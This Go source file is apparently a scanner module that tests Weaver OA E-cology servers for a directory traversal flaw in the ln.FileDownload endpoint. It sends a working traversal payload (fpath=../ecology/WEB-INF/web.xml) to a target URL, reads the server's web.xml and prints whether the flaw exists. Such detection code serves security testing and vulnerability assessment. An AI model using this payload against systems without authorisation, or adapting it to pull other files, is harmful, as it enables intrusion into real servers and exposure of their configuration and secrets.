package ecology_filedownload_directory_traversal

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		return strings.Contains(resp.String(), "<url-pattern>/weaver/")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
		color.Green.Println("[+05] 泛微OA E-Colgoy filedownload文件目录遍历漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[-05] 泛微OA E-Colgoy filedownload文件目录遍历漏洞不存在")
	}
}
